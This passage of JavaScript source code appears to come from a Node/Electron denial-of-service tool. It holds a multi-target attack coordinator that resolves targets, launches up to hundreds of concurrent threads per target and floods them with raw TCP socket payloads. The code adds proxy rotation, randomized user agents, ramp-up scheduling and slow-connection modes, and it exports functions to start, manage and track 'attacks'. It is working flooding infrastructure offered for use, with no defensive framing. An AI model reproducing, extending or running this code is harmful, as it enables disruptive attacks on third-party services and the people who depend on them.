        return crypto.randomBytes(Math.ceil(length/2))
            .toString('hex')
            .slice(0, length);
    }

    static randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    static randomIP() {
        return `${this.randomInt(1, 254)}.${this.randomInt(1, 254)}.${this.randomInt(1, 254)}.${this.randomInt(1, 254)}`;
    }

    static getRandomUserAgent(userAgents) {
        if (!userAgents || userAgents.length === 0) {
            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
        }
        return userAgents[this.randomInt(0, userAgents.length - 1)];
    }

    static sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    static formatDuration(ms) {
        const seconds = Math.floor(ms / 1000);
        const minutes = Math.floor(seconds / 60);
        const hours = Math.floor(minutes / 60);
        
        if (hours > 0) {
            return `${hours}h ${minutes % 60}m ${seconds % 60}s`;
        } else if (minutes > 0) {
            return `${minutes}m ${seconds % 60}s`;
        } else {
            return `${seconds}s`;
        }
    }

    static calculateOptimalThreads(targetCount, systemResources) {
        const cpuCores = os.cpus().length;
        const totalMemory = os.totalmem();
        const freeMemory = os.freemem();
        
        // Base threads per target on CPU cores and available memory
        const baseThreadsPerTarget = Math.max(cpuCores, 10);
        const memoryConstraint = Math.floor(freeMemory / (targetCount * 1024 * 1024)); // Rough estimation
        
        return Math.min(baseThreadsPerTarget, memoryConstraint, 200); // Max 200 threads per target
    }
}

// Multi-Target Attack Coordinator
class MultiTargetAttackCoordinator extends EventEmitter {
    constructor(config) {
        super();
        this.config = new MultiTargetConfig(config);
        this.config.validate();
        
        this.resourceManager = GlobalResourceManager.getInstance();
        this.stats = new MultiTargetStats();
        this.proxyManager = new ProxyManager();
        this.threadingManager = new ThreadingManager();
        
        this.attackId = crypto.randomUUID().substring(0, 8);
        this.targetAttacks = new Map();
        this.isRunning = false;
        this.shouldStop = false;
        this.resolvedTargets = new Map();
        
        if (this.config.useProxies && this.config.proxyList.length > 0) {
            this.proxyManager.loadProxies(this.config.proxyList);
        }
        
        // Setup event forwarding
        this.stats.on('target-stats-updated', (data) => {
            this.emit('target-progress', data);
        });
        
        this.stats.on('global-stats-updated', (data) => {
            this.emit('global-progress', data);
        });
    }

    async start() {
        if (this.isRunning) {
            throw new Error('Attack is already running');
        }

        this.isRunning = true;
        this.shouldStop = false;
        
        logger.info(`Starting multi-target attack ${this.attackId}`, this.attackId);
        logger.info(`Targets: ${this.config.targets.length}, Method: ${this.config.method}, Layer: ${this.config.layer}`, this.attackId);
        
        try {
            // Register with global resource manager
            this.resourceManager.registerAttack(this.attackId, this);
            
            // Check resource availability
            const totalThreadsNeeded = this.config.targets.length * this.config.threadsPerTarget;
            const resourceCheck = this.resourceManager.canAllocateResources(
                totalThreadsNeeded, 
                this.config.targets.length * 100 // Rough connection estimate
            );
            
            if (!resourceCheck.canProceed) {
                const reasons = Object.entries(resourceCheck.reasons)
                    .filter(([key, value]) => !value)
                    .map(([key]) => key);
                throw new Error(`Insufficient resources: ${reasons.join(', ')}`);
            }
            
            // Resolve all targets
            logger.info('Resolving targets...', this.attackId);
            this.resolvedTargets = await AdvancedUtils.resolveTargets(this.config.targets);
            
            // Initialize statistics for each target
            this.config.targets.forEach(target => {
                this.stats.initializeTarget(target.id, target);
            });
            
            // Start real-time monitoring
            this.stats.startRealTimeMonitoring();
            
            // Initialize threading if needed
            if (this.config.threadsPerTarget > 50) {
                await this.threadingManager.initializeWorkerPool();
            }
            
            // Execute attack based on coordination strategy
            if (this.config.coordinateTargets) {
                await this.executeCoordinatedAttack();
            } else {
                await this.executeParallelAttack();
            }
            
        } catch (error) {
            logger.error(`Multi-target attack failed: ${error.message}`, this.attackId);
            throw error;
        } finally {
            await this.cleanup();
        }

        const globalReport = this.stats.getGlobalSummary();
        this.stats.finalize();
        
        logger.success(`Multi-target attack ${this.attackId} completed`, this.attackId);
        this.printSummaryReport(globalReport);
        
        return globalReport;
    }

    async executeCoordinatedAttack() {
        logger.info('Executing coordinated multi-target attack', this.attackId);
        
        // Sort targets by priority
        const sortedTargets = [...this.config.targets].sort((a, b) => b.priority - a.priority);
        
        if (this.config.rampUpTime > 0) {
            await this.executeRampUpCoordinated(sortedTargets);
        } else {
            await this.executeFullScaleCoordinated(sortedTargets);
        }
    }

    async executeRampUpCoordinated(sortedTargets) {
        const rampUpSteps = Math.min(10, sortedTargets.length);
        const stepInterval = this.config.rampUpTime * 1000 / rampUpSteps;
        const targetsPerStep = Math.ceil(sortedTargets.length / rampUpSteps);
        
        for (let step = 0; step < rampUpSteps && !this.shouldStop; step++) {
            const stepTargets = sortedTargets.slice(step * targetsPerStep, (step + 1) * targetsPerStep);
            
            logger.info(`Ramp-up step ${step + 1}/${rampUpSteps}: Starting ${stepTargets.length} targets`, this.attackId);
            
            // Start targets in this step
            const stepPromises = stepTargets.map(target => this.startTargetAttack(target));
            
            // Don't await - let them run concurrently
            Promise.allSettled(stepPromises);
            
            if (step < rampUpSteps - 1 && this.config.targetDelay > 0) {
                await AdvancedUtils.sleep(stepInterval);
            }
        }
        
        // Wait for attack duration
        const remainingTime = this.config.duration * 1000;
        await AdvancedUtils.sleep(remainingTime);
        
        this.shouldStop = true;
    }

    async executeFullScaleCoordinated(sortedTargets) {
        logger.info('Starting all targets simultaneously', this.attackId);
        
        const attackPromises = [];
        
        for (const target of sortedTargets) {
            if (this.shouldStop) break;
            
            attackPromises.push(this.startTargetAttack(target));
            
            // Delay between target starts if configured
            if (this.config.targetDelay > 0) {
                await AdvancedUtils.sleep(this.config.targetDelay);
            }
        }
        
        // Wait for attack duration or until stopped
        const timeoutPromise = AdvancedUtils.sleep(this.config.duration * 1000)
            .then(() => { this.shouldStop = true; });

        await Promise.race([
            Promise.allSettled(attackPromises),
            timeoutPromise
        ]);
        
        this.shouldStop = true;
    }

    async executeParallelAttack() {
        logger.info('Executing parallel multi-target attack', this.attackId);
        
        // Start all targets simultaneously without coordination
        const attackPromises = this.config.targets.map(target => this.startTargetAttack(target));
        
        // Wait for attack duration
        const timeoutPromise = AdvancedUtils.sleep(this.config.duration * 1000)
            .then(() => { this.shouldStop = true; });

        await Promise.race([
            Promise.allSettled(attackPromises),
            timeoutPromise
        ]);
        
        this.shouldStop = true;
    }

    async startTargetAttack(target) {
        const targetInfo = this.resolvedTargets.get(target.id);
        if (!targetInfo) {
            logger.error(`Failed to resolve target ${target.target}`, this.attackId, target.id);
            return;
        }

        logger.info(`Starting attack on ${target.target} (${targetInfo.ip}:${targetInfo.port})`, this.attackId, target.id);
        
        // Calculate threads for this target based on weight and available resources
        const baseThreads = this.config.threadsPerTarget;
        const weightedThreads = Math.round(baseThreads * target.weight);
        const allocatedConnections = this.resourceManager.allocateConnections(weightedThreads * 2, this.attackId);
        const actualThreads = Math.min(weightedThreads, Math.floor(allocatedConnections / 2));
        
        if (actualThreads <= 0) {
            logger.warn(`No resources available for target ${target.target}`, this.attackId, target.id);
            return;
        }
        
        logger.debug(`Allocated ${actualThreads} threads for ${target.target}`, this.attackId, target.id);
        
        // Create target-specific attack configuration
        const targetConfig = {
            ...this.config,
            target: target.target,
            threads: actualThreads,
            targetId: target.id,
            customConfig: target.customConfig
        };
        
        // Start attack threads for this target
        const threadPromises = Array.from(
            { length: actualThreads }, 
            (_, threadIndex) => this.runTargetThread(targetInfo, targetConfig, threadIndex)
        );

        await Promise.allSettled(threadPromises);
        
        // Release allocated connections
        this.resourceManager.releaseConnections(allocatedConnections, this.attackId);
        
        logger.info(`Completed attack on ${target.target}`, this.attackId, target.id);
        this.stats.finalizeTarget(target.id);
    }

    async runTargetThread(targetInfo, targetConfig, threadIndex) {
        const threadId = `${targetConfig.targetId}-${threadIndex}`;
        let requestCount = 0;
        
        while (!this.shouldStop) {
            try {
                const startTime = performance.now();
                
                // Get proxy if using proxies
                let proxy = null;
                if (this.config.useProxies) {
                    proxy = this.proxyManager.getNextProxy();
                }
                
                // Execute attack request
                await this.executeTargetRequest(targetInfo, targetConfig, proxy);
                
                const responseTime = performance.now() - startTime;
                requestCount++;
                
                // Update statistics
                this.stats.updateTargetStats(targetConfig.targetId, {
                    requests: 1,
                    successful: 1,
                    bytes: targetConfig.payloadSize || 1024,
                    responseTime: responseTime,
                    bandwidth: (targetConfig.payloadSize || 1024) / (responseTime / 1000)
                });
                
                // Apply delay if configured
                if (this.config.targetDelay > 0) {
                    await AdvancedUtils.sleep(this.config.targetDelay);
                }
                
            } catch (error) {
                this.stats.updateTargetStats(targetConfig.targetId, {
                    requests: 1,
                    failed: 1,
                    errors: 1,
                    errorType: error.name || 'UnknownError'
                });
                
                logger.debug(`Thread ${threadId} error: ${error.message}`, this.attackId, targetConfig.targetId);
            }
        }
        
        logger.debug(`Thread ${threadId} completed with ${requestCount} requests`, this.attackId, targetConfig.targetId);
    }

    async executeTargetRequest(targetInfo, targetConfig, proxy = null) {
        const socket = new net.Socket();
        socket.setTimeout(this.config.globalTimeout);
        
        return new Promise((resolve, reject) => {
            const cleanup = () => {
                if (!socket.destroyed) {
                    socket.destroy();
                }
            };

            socket.on('timeout', () => {
                cleanup();
                reject(new Error('Connection timeout'));
            });

            socket.on('error', (err) => {
                if (proxy) {
                    this.proxyManager.markProxyFailed(proxy, err.message);
                }
                cleanup();
                reject(err);
            });

            const connectHandler = () => {
                if (proxy) {
                    this.proxyManager.markProxyWorking(proxy);
                }
                
                try {
                    const payload = AdvancedUtils.generatePayload(
                        this.config.method, 
                        targetConfig.target, 
                        targetConfig
                    );
                    
                    socket.write(payload);
                    
                    // For most attacks, close immediately unless it's a slow attack
                    if (this.config.method !== 'SLOW') {
                        cleanup();
                        resolve();
                    }
                } catch (writeError) {
                    cleanup();
                    reject(writeError);
                }
            };

            if (proxy) {
                // Connect through proxy (simplified implementation)
                socket.connect(proxy.port, proxy.host, connectHandler);
            } else {
                // Direct connection
                socket.connect(targetInfo.port, targetInfo.ip, connectHandler);
            }
        });
    }

    async stop() {
        logger.info(`Stopping multi-target attack ${this.attackId}`, this.attackId);
        this.shouldStop = true;
        await this.cleanup();
    }

    async cleanup() {
        this.isRunning = false;
        
        // Stop monitoring
        this.stats.stopRealTimeMonitoring();
        
        // Shutdown threading manager
        await this.threadingManager.shutdown();
        
        // Unregister from global resource manager
        this.resourceManager.unregisterAttack(this.attackId);
        
        // Clear target attacks
        this.targetAttacks.clear();
        
        logger.debug(`Cleanup completed for attack ${this.attackId}`, this.attackId);
    }

    printSummaryReport(globalReport) {
        console.log(`\n${Colors.CYAN}${Colors.BOLD}=== MULTI-TARGET ATTACK SUMMARY ===${Colors.RESET}`);
        console.log(`${Colors.WHITE}Attack ID: ${Colors.GREEN}${this.attackId}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Total Targets: ${Colors.GREEN}${globalReport.totalTargets}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Duration: ${Colors.GREEN}${globalReport.duration} seconds${Colors.RESET}`);
        console.log(`${Colors.WHITE}Total Requests: ${Colors.GREEN}${globalReport.totalRequests}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Average RPS: ${Colors.GREEN}${globalReport.averageRequestsPerSecond}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Total Bandwidth: ${Colors.GREEN}${globalReport.currentTotalBandwidthFormatted}${Colors.RESET}`);
        console.log(`${Colors.WHITE}Total Data Sent: ${Colors.GREEN}${globalReport.totalBytesFormatted}${Colors.RESET}`);
        
        if (globalReport.totalErrors > 0) {
            console.log(`${Colors.YELLOW}Total Errors: ${globalReport.totalErrors}${Colors.RESET}`);
        }
        
        console.log(`\n${Colors.CYAN}Target Details:${Colors.RESET}`);
        globalReport.targets.forEach(target => {
            const status = target.isActive ? `${Colors.GREEN}ACTIVE${Colors.RESET}` : `${Colors.GRAY}COMPLETED${Colors.RESET}`;
            console.log(`  ${Colors.WHITE}${target.target}: ${status} - ${target.requestsPerSecond} RPS, ${target.successRate}% success${Colors.RESET}`);
        });
        
        if (this.config.useProxies) {
            const proxyStats = this.proxyManager.getStats();
            console.log(`\n${Colors.CYAN}Proxy Statistics:${Colors.RESET}`);
            console.log(`  ${Colors.WHITE}Total Proxies: ${Colors.GREEN}${proxyStats.total}${Colors.RESET}`);
            console.log(`  ${Colors.WHITE}Working: ${Colors.GREEN}${proxyStats.working}${Colors.RESET}`);
            console.log(`  ${Colors.WHITE}Failed: ${Colors.RED}${proxyStats.failed}${Colors.RESET}`);
        }
        
        console.log(`${Colors.CYAN}${Colors.BOLD}=======================================\n${Colors.RESET}`);
    }

    getAttackStats() {
        return {
            attackId: this.attackId,
            isRunning: this.isRunning,
            globalStats: this.stats.getGlobalSummary(),
            proxyStats: this.config.useProxies ? this.proxyManager.getStats() : null,
            threadingStats: this.threadingManager.getWorkerStats(),
            resourceStats: this.resourceManager.getGlobalStats()
        };
    }
}

// Single Target Attack for backward compatibility and focused attacks
class SingleTargetAttack extends EventEmitter {
    constructor(target, layer, method, duration, options = {}) {
        super();
        
        // Convert to multi-target config for consistency
        const config = {
            targets: [target],
            layer,
            method,
            duration,
            threadsPerTarget: options.threads || Math.max(os.cpus().length, 10),
            ...options
        };
        
        this.multiTargetAttack = new MultiTargetAttackCoordinator(config);
        
        // Forward events
        this.multiTargetAttack.on('target-progress', (data) => {
            this.emit('progress', data.stats);
        });
        
        this.multiTargetAttack.on('global-progress', (data) => {
            this.emit('global-progress', data);
        });
    }

    async start() {
        const result = await this.multiTargetAttack.start();
        
        // Return single target format for backward compatibility
        if (result.targets && result.targets.length > 0) {
            const targetResult = result.targets[0];
            return {
                totalDuration: targetResult.duration,
                requestsPerSecond: targetResult.requestsPerSecond,
                successRate: targetResult.successRate,
                totalBytesSent: targetResult.totalBytes,
                totalBytesSentFormatted: targetResult.totalBytesFormatted,
                totalRequests: targetResult.totalRequests,
                currentBandwidth: targetResult.currentBandwidth,
                currentBandwidthFormatted: targetResult.currentBandwidthFormatted,
                errorSummary: targetResult.errorSummary,
                globalStats: result
            };
        }
        
        return result;
    }

    async stop() {
        return await this.multiTargetAttack.stop();
    }

    getStats() {
        return this.multiTargetAttack.getAttackStats();
    }
}

// Attack Manager for coordinating multiple attack sessions
class AttackManager extends EventEmitter {
    constructor() {
        super();
        this.activeAttacks = new Map();
        this.attackHistory = [];
        this.maxConcurrentAttacks = 5;
        this.resourceManager = GlobalResourceManager.getInstance();
        
        // Setup global resource monitoring
        this.resourceManager.on('global-monitoring-update', (stats) => {
            this.emit('resource-update', stats);
        });
    }

    async startAttack(config) {
        // Check if we can start another attack
        if (this.activeAttacks.size >= this.maxConcurrentAttacks) {
            throw new Error(`Maximum concurrent attacks (${this.maxConcurrentAttacks}) reached`);
        }
        
        const attackId = crypto.randomUUID().substring(0, 8);
        let attack;
        
        try {
            // Determine attack type based on targets
            if (Array.isArray(config.targets) && config.targets.length > 1) {
                attack = new MultiTargetAttackCoordinator(config);
                logger.info(`Starting multi-target attack ${attackId} with ${config.targets.length} targets`);
            } else {
                // Single target - use backward compatible interface
                const target = Array.isArray(config.targets) ? config.targets[0] : config.target;
                attack = new SingleTargetAttack(target, config.layer, config.method, config.duration, config);
                logger.info(`Starting single-target attack ${attackId} on ${target}`);
            }

            // Set up event forwarding
            attack.on('target-progress', (data) => {
                this.emit('attack-progress', { attackId, ...data });
            });

            attack.on('global-progress', (data) => {
                this.emit('attack-global-progress', { attackId, ...data });
            });

            this.activeAttacks.set(attackId, {
                attack,
                config,
                startTime: Date.now(),
                type: Array.isArray(config.targets) && config.targets.length > 1 ? 'multi-target' : 'single-target'
            });
            
            logger.info(`Starting attack ${attackId}`);
            const result = await attack.start();
            
            // Record in history
            this.attackHistory.push({
                id: attackId,
                config: config,
                result: result,
                startTime: this.activeAttacks.get(attackId).startTime,
                endTime: Date.now(),
                type: this.activeAttacks.get(attackId).type
            });
            
            // Keep only last 50 attacks in history
            if (this.attackHistory.length > 50) {
                this.attackHistory.shift();
            }
            
            this.activeAttacks.delete(attackId);
            this.emit('attack-completed', { attackId, result });
            
            return { attackId, result };
            
        } catch (error) {
            this.activeAttacks.delete(attackId);
            this.emit('attack-failed', { attackId, error: error.message });
            throw error;
        }
    }

    async stopAttack(attackId) {
        const attackInfo = this.activeAttacks.get(attackId);
        if (attackInfo) {
            await attackInfo.attack.stop();
            this.activeAttacks.delete(attackId);
            logger.info(`Stopped attack ${attackId}`);
            this.emit('attack-stopped', { attackId });
        } else {
            throw new Error(`Attack ${attackId} not found`);
        }
    }

    async stopAllAttacks() {
        const stopPromises = Array.from(this.activeAttacks.keys()).map(id => 
            this.stopAttack(id).catch(err => logger.error(`Failed to stop attack ${id}: ${err.message}`))
        );
        await Promise.allSettled(stopPromises);
        logger.info('All attacks stopped');
    }

    getActiveAttacks() {
        return Array.from(this.activeAttacks.entries()).map(([id, info]) => ({
            attackId: id,
            type: info.type,
            startTime: info.startTime,
            duration: Date.now() - info.startTime,
            config: {
                targets: info.config.targets,
                method: info.config.method,
                layer: info.config.layer
            }
        }));
    }

    getAttackHistory() {
        return this.attackHistory.slice(-20); // Last 20 attacks
    }

    getAttackStats(attackId) {
        const attackInfo = this.activeAttacks.get(attackId);
        return attackInfo ? attackInfo.attack.getStats() : null;
    }

    getGlobalStats() {
        return {
            activeAttacks: this.activeAttacks.size,
            totalAttacksInHistory: this.attackHistory.length,
            resourceStats: this.resourceManager.getGlobalStats(),
            activeAttacksList: this.getActiveAttacks()
        };
    }

    setMaxConcurrentAttacks(max) {
        this.maxConcurrentAttacks = Math.max(1, Math.min(max, 20)); // Between 1 and 20
        logger.info(`Maximum concurrent attacks set to ${this.maxConcurrentAttacks}`);
    }
}

// Create global instances
const logger = new Logger();
const attackManager = new AttackManager();
const globalResourceManager = GlobalResourceManager.getInstance();

// Exported functions for Electron integration and external use
module.exports = {
    // Primary attack functions (backward compatible)
    startAttack: async (target, layer, method, duration, options = {}) => {
        try {
            const config = {
                target,
                targets: [target],
                layer,
                method,
                duration,
                ...options
            };
            
            const { result } = await attackManager.startAttack(config);
            return result;
        } catch (error) {
            logger.error(`Attack failed: ${error.message}`);
            throw error;
        }
    },

    // Enhanced multi-target attack function
    startMultiTargetAttack: async (config) => {
        try {
            const { result } = await attackManager.startAttack(config);
            return result;
        } catch (error) {
            logger.error(`Multi-target attack failed: ${error.message}`);
            throw error;
        }
    },

    // Enhanced single attack with full configuration
    startEnhancedAttack: async (config) => {
        try {
            const { result } = await attackManager.startAttack(config);
            return result;
        } catch (error) {
            logger.error(`Enhanced attack failed: ${error.message}`);
            throw error;
        }
    },

    // Attack management functions
    stopAttack: async (attackId) => {
        return await attackManager.stopAttack(attackId);
    },

    stopAllAttacks: async () => {
        return await attackManager.stopAllAttacks();
    },

    getActiveAttacks: () => {
        return attackManager.getActiveAttacks();
    },

    getAttackStats: (attackId) => {
        return attackManager.getAttackStats(attackId);
    },

    getAttackHistory: () => {
        return attackManager.getAttackHistory();
    },

    getGlobalStats: () => {
        return attackManager.getGlobalStats();
    },

    // Resource management
    getResourceStats: () => {
        return globalResourceManager.getGlobalStats();
    },

    setResourceLimits: (limits) => {
        Object.assign(globalResourceManager.resourceLimits, limits);
        logger.info('Resource limits updated', null, null);
    },

    // Configuration and validation
    validateConfig: (config) => {
        try {
            const testConfig = new MultiTargetConfig(config);
            testConfig.validate();
            return { valid: true, config: testConfig };
        } catch (error) {
            return { valid: false, error: error.message };
        }
    },

    validateProxies: async (proxyList) => {
        const manager = new ProxyManager();
        manager.loadProxies(proxyList);
        await manager.validateProxiesInBackground();
        return manager.getStats();
    },

    // Utility functions
    resolveTarget: AdvancedUtils.normalizeTarget,
    resolveTargets: AdvancedUtils.resolveTargets,
    generatePayload: AdvancedUtils.generatePayload,
    calculateOptimalThreads: AdvancedUtils.calculateOptimalThreads,

    // Logging functions
    setLogLevel: (level) => {
        logger.logLevel = level;
        logger.info(`Log level set to ${level}`);
    },

    setLogFile: (filePath) => {
        logger.setLogFile(filePath);
    },

    getRecentLogs: (count, attackId, level) => {
        return logger.getRecentLogs(count, attackId, level);
    },

    // Event emitters for integration
    attackManager,
    logger,
    globalResourceManager,

    // Advanced classes for custom implementations
    MultiTargetAttackCoordinator,
    SingleTargetAttack,
    MultiTargetConfig,
    ProxyManager,
    ThreadingManager,
    AdvancedUtils,
    
    // System information
    getSystemInfo: () => ({
        cpus: os.cpus(),
        platform: os.platform(),
        arch: os.arch(),
        networkInterfaces: os.networkInterfaces(),
        memory: {
            total: os.totalmem(),
            free: os.freemem(),
            usage: process.memoryUsage()
        },
        uptime: os.uptime(),
        loadavg: os.loadavg(),
        resourceLimits: globalResourceManager.getResourceLimits()
    }),

    // Configuration helpers
    createSingleTargetConfig: (target, layer, method, duration, options = {}) => ({
        targets: [target],
        layer,
        method,
        duration,
        ...options
    }),

    createMultiTargetConfig: (targets, layer, method, duration, options = {}) => ({
        targets,
        layer,
        method,
        duration,
        ...options
    }),

    // Monitoring and events
    onAttackProgress: (callback) => {
        attackManager.on('attack-progress', callback);
        return () => attackManager.off('attack-progress', callback);
    },

    onAttackCompleted: (callback) => {
        attackManager.on('attack-completed', callback);
        return () => attackManager.off('attack-completed', callback);
    },

    onResourceUpdate: (callback) => {
        attackManager.on('resource-update', callback);
        return () => attackManager.off('resource-update', callback);
    },

    onLog: (callback) => {
        logger.on('log', callback);
        return () => logger.off('log', callback);
    }
};

// Enhanced error handlers with better logging
process.on('uncaughtException', (error) => {
    logger.critical(`Uncaught Exception: ${error.message}`);
    logger.critical(error.stack);
    
    // Try graceful shutdown
    attackManager.stopAllAttacks()
        .then(() => process.exit(1))
        .catch(() => process.exit(1));
});

process.on('unhandledRejection', (reason, promise) => {
    logger.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Graceful shutdown handlers
const gracefulShutdown = async (signal) => {
    logger.info(`Received ${signal}, performing graceful shutdown...`);
    
    try {
        await attackManager.stopAllAttacks();
        globalResourceManager.cleanup();
        logger.info('Graceful shutdown completed');
        process.exit(0);
    } catch (error) {
        logger.error(`Error during shutdown: ${error.message}`);
        process.exit(1);
    }
};

process.on('SIGINT', () => gracefulShutdown('SIGINT'));
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));

// Optional: Export for advanced users who want to extend functionality
module.exports.internals = {
    GlobalResourceManager,
    Logger,
    MultiTargetStats,
    ProxyManager,
    ThreadingManager,
    AttackManager
};